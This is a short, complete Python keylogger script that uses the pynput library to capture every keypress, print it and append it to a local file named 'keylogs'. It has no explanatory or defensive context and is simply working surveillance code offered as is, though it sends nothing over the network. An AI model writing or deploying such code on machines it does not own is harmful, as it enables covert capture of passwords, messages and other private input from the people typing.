#!/usr/bin/env python3
""" Import """
from pynput.keyboard import Key, Listener


def on_press(key):
    with open('keylogs', 'a') as fp:
        print(key)
        fp.write(str(key) + '\n')


with Listener(on_press=on_press) as listener:
    listener.join()
